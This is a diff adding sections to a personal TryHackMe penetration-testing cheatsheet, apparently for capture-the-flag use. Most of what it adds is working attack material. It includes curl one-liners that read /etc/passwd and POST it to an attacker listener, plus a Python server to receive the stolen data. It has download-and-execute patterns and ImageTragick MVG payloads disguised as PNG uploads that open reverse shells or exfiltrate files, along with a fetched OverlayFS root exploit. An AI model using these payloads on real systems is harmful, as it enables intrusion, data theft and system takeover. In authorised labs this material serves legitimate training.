@@ -10,6 +10,7 @@ Personal cheatsheet of frequently used commands across TryHackMe engagements. Or
 - [Web Enumeration](#-web-enumeration)
 - [SQL Injection](#-sql-injection)
 - [LFI / Path Traversal](#-lfi--path-traversal)
+- [SSRF](#-ssrf)
 - [Encoding / Decoding](#-encoding--decoding)
 - [Shells](#-shells)
 - [SSH / Brute-force](#-ssh)
@@ -25,6 +26,18 @@ Personal cheatsheet of frequently used commands across TryHackMe engagements. Or
 
 ## 🔍 Recon & Port Scanning
 
+### rustscan
+
+Run rustscan first to find open ports fast, then pass them to nmap for service detection.
+
+```bash
+# Fast port discovery
+rustscan -a <target> --ulimit 5000 -b 4500 -t 1500
+
+# Pipe open ports straight into nmap
+rustscan -a <target> --ulimit 5000 -- -sC -sV
+```
+
 ### nmap
 
 ```bash
@@ -37,6 +50,16 @@ sudo nmap -sU --top-ports 200 -vv -T4 <target> -oA udp-scan
 # Script scan on specific port
 sudo nmap -sC -sV -p <port> <target>
 ```
+
+### FTP Anonymous Login
+
+```bash
+ftp <target>
+# username: anonymous
+# password: anonymous (or blank)
+```
+
+Always read the full login banner — CTF boxes hide hints there. Directory listing may be denied even on a successful login.
 
 ---
 
@@ -251,6 +274,82 @@ ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv
 CMD=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "id")
 
 curl -s "http://<target>/vuln.php?view=${ENCODED}&cmd=${CMD}" | strings | grep -v "html\|head\|body"
+```
+
+---
+
+## 🔄 SSRF
+
+### curl file:// — Local File Read via Injection
+
+When you have command injection but no interactive shell, use `curl file://` to read local files and POST them back to your listener. This avoids shell redirects (`>`) which may silently fail.
+
+```bash
+# Two-curl exfil pattern — read a file and POST it back
+curl -s file:///etc/passwd -o /tmp/r.txt; curl -s --data-binary @/tmp/r.txt http://<LHOST>:<PORT>/label
+
+# Read /proc/net/tcp to find localhost-only listening ports (no ss/netstat needed)
+curl -s file:///proc/net/tcp -o /tmp/r.txt; curl -s --data-binary @/tmp/r.txt http://<LHOST>:<PORT>/nettcp
+```
+
+Decode `/proc/net/tcp` addresses manually — each `local_address` is little-endian hex `IP:PORT`:
+
+```bash
+# e.g. 0100007F:1A0A → 127.0.0.1:6666
+python3 -c "import socket,struct; print(socket.inet_ntoa(struct.pack('<I', int('0100007F',16))), int('1A0A',16))"
+```
+
+### HTTP Exfil Listener — Capture POST Bodies and Serve Files
+
+Run this on your attacker machine. Handles both GET (serve scripts to the target) and POST (receive exfil from the target) on a single port.
+
+```python
+# listener.py
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import os
+
+SERVE_DIR = "/tmp/ssrf_results"
+
+class Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(length)
+        path = self.path.strip('/')
+        os.makedirs(SERVE_DIR, exist_ok=True)
+        with open(f"{SERVE_DIR}/{path}_.txt", 'wb') as f:
+            f.write(body)
+        print(f"[POST] {self.path} ({length} bytes)", flush=True)
+        print(body.decode(errors='replace')[:1000], flush=True)
+        self.send_response(200)
+        self.end_headers()
+
+    def do_GET(self):
+        filepath = os.path.join(SERVE_DIR, self.path.strip('/'))
+        if os.path.exists(filepath):
+            data = open(filepath, 'rb').read()
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(data)
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def log_message(self, *a): pass
+
+HTTPServer(('0.0.0.0', 9998), Handler).serve_forever()
+```
+
+```bash
+python3 listener.py &
+```
+
+### Executing Scripts via Injection (nohup detach)
+
+When running bash scripts through an injection that runs in a pipe context, bash reads stdin from the pipe and hangs. Detach it with `nohup` and background it.
+
+```bash
+# Download and exec pattern — detached from pipe stdin
+curl -s http://<LHOST>:<PORT>/script.sh -o /tmp/s.sh; nohup bash /tmp/s.sh &
 ```
 
 ---
@@ -492,6 +591,40 @@ impacket-lookupsid <domain>/guest@<target> | grep SidTypeUser
 ---
 
 ## 🔧 Service Exploitation
+
+### ImageTragick — CVE-2016-3714 (ImageMagick RCE)
+
+ImageMagick passes the URL inside `fill 'url(...)'` in an MVG file to a shell delegate without sanitisation. Break out with `"` to inject commands. Upload the MVG disguised as an image (filename and `Content-Type: image/png`).
+
+**Injection rules:**
+- No `|` inside the command — it is the pipe delimiter and closes the injection
+- No `>` shell redirect — use `curl -o` to write files instead
+- Chain commands with `&&` or `;`
+
+```bash
+# payload.mvg — rename to .png and upload as image/png
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/x.png"|<COMMAND>|")'
+pop graphic-context
+```
+
+```bash
+# Confirm RCE — outbound HTTP callback
+fill 'url(https://127.0.0.1/x.png"|curl http://<LHOST>:<PORT>/rce|")'
+
+# Download and exec a reverse shell (avoids pipe restriction)
+fill 'url(https://127.0.0.1/x.png"|curl http://<LHOST>:<PORT>/shell.sh -o /tmp/s && sh /tmp/s|")'
+
+# SSRF file read — two-curl exfil (avoids shell redirect restriction)
+fill 'url(https://127.0.0.1/x.png"|curl -s file:///etc/passwd -o /tmp/r.txt;curl -s --data-binary @/tmp/r.txt http://<LHOST>:<PORT>/passwd|")'
+```
+
+```bash
+# Upload via curl
+curl -X POST http://<target>:<port>/upload \
+  -F "file=@payload.mvg;type=image/png;filename=x.png"
+```
 
 ### Tomcat — WAR File Upload RCE
 
@@ -908,6 +1041,29 @@ sudo /usr/bin/socat stdin exec:/bin/sh
 # or, for a fully interactive PTY:
 sudo socat TCP-LISTEN:<LPORT>,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
 socat FILE:$(tty),raw,echo=0 TCP:<target>:<LPORT>
+```
+
+### CVE-2021-3493 — Ubuntu OverlayFS LPE
+
+Affects Ubuntu kernels before 5.11 (Ubuntu 16.04–20.04). Gives root directly from any user shell with no prerequisites.
+
+```bash
+# On attacker
+wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
+gcc exploit.c -o exploit
+python3 -m http.server 8000
+
+# On target
+wget http://<LHOST>:8000/exploit -O /tmp/exploit
+chmod +x /tmp/exploit
+/tmp/exploit
+# → root shell
+```
+
+Check kernel version first:
+
+```bash
+uname -r   # vulnerable: < 5.11 on Ubuntu (e.g. 4.15.0-xxx, 5.4.0-xxx)
 ```
 
 ### lxd / Docker Group
